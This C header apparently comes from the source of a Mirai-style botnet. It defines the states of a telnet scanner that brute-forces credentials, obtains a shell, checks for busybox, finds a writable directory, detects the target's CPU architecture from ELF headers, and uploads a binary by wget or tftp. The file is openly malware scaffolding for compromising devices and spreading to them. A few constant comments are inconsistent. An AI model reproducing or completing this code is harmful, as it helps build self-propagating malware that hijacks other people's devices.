#pragma once

#include <stdint.h>

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

enum {
    TELNET_UPLOAD_METHOD_NONE = 0,
    TELNET_UPLOAD_METHOD_WGET = 1,
    TELNET_UPLOAD_METHOD_TFTP = 2,

    TELNET_STATE_NOT_CONNECTED = 0,
    TELNET_STATE_CONNECTING = 1,
    TELNET_STATE_SEND_IACS = 2,
    TELNET_STATE_SEND_USERNAME = 3,
    TELNET_STATE_SEND_PASSWORD = 4,
    TELNET_STATE_SEND_SHELL = 5,
    TELNET_STATE_CHECK_BUSYBOX = 6,
    TELNET_STATE_FIND_WR_DIR = 7,
    TELNET_STATE_CHECK_ARCH = 8,
    TELNET_STATE_CHECK_ARCH_ARM = 9,
    TELNET_STATE_CHECK_WGET = 10,
    TELNET_STATE_CHECK_TFTP = 11,
    TELNET_STATE_UPLOAD = 12
};

#define EI_NIDENT   16 // Side of e_ident in elf header
#define EI_DATA     5  // Offset endianness in e_ident

#define EE_NONE     0 // No endianness ????
#define EE_LITTLE   1 // Little endian
#define EE_BIG      2 // Big endian

#define ET_NOFILE   0 // None
#define ET_REL      1 // Relocatable file
#define ET_EXEC     2 // Executable file
#define ET_DYN      3 // Shared object file
#define ET_CORE     4 // Core file

/* These constants define the various ELF target machines */
#define EM_NONE         0
#define EM_M32          1
#define EM_SPARC        2
#define EM_386          3
#define EM_68K          4 // m68k
#define EM_88K          5 // m68k
#define EM_486          6 // x86
#define EM_860          7 // Unknown
#define EM_MIPS         8       /* MIPS R3000 (officially, big-endian only) */
                                /* Next two are historical and binaries and
                                   modules of these types will be rejected by
                                   Linux.  */
#define EM_MIPS_RS3_LE  10      /* MIPS R3000 little-endian */
#define EM_MIPS_RS4_BE  10      /* MIPS R4000 big-endian */

#define EM_PARISC       15      /* HPPA */
#define EM_SPARC32PLUS  18      /* Sun's "v8plus" */
#define EM_PPC          20      /* PowerPC */
#define EM_PPC64        21      /* PowerPC64 */
#define EM_SPU          23      /* Cell BE SPU */
#define EM_ARM          40      /* ARM 32 bit */
#define EM_SH           42      /* SuperH */
#define EM_SPARCV9      43      /* SPARC v9 64-bit */
#define EM_H8_300       46      /* Renesas H8/300 */
#define EM_IA_64        50      /* HP/Intel IA-64 */
#define EM_X86_64       62      /* AMD x86-64 */
#define EM_S390         22      /* IBM S/390 */
#define EM_CRIS         76      /* Axis Communications 32-bit embedded processor */
#define EM_M32R         88      /* Renesas M32R */
#define EM_MN10300      89      /* Panasonic/MEI MN10300, AM33 */
#define EM_OPENRISC     92     /* OpenRISC 32-bit embedded processor */
#define EM_BLACKFIN     106     /* ADI Blackfin Processor */
#define EM_ALTERA_NIOS2 113     /* Altera Nios II soft-core processor */
#define EM_TI_C6000     140     /* TI C6X DSPs */
#define EM_AARCH64      183     /* ARM 64 bit */
#define EM_TILEPRO      188     /* Tilera TILEPro */
#define EM_MICROBLAZE   189     /* Xilinx MicroBlaze */
#define EM_TILEGX       191     /* Tilera TILE-Gx */
#define EM_FRV          0x5441  /* Fujitsu FR-V */
#define EM_AVR32        0x18ad  /* Atmel AVR32 */

struct elf_hdr {
    uint8_t e_ident[EI_NIDENT];
    uint16_t e_type, e_machine;
    uint32_t e_version;
} __attribute__((packed));

struct telnet_auth_entry_t {
    char username[64];
    char password[64];
};

struct telnet_writable_dir_t {
    char path[32];
    int path_pos;
    int state;
};

struct telnet_data_t {
    struct telnet_writable_dir_t dir;
    char arch[16];
    uint8_t upload_method;
    int fd;
    int wait;
    int timeout;
    uint8_t cred_pos;
    uint8_t cred_retry;
    uint8_t connected;
    uint8_t state;
    uint32_t addr;
};

void telnet_scanner_init(void *);
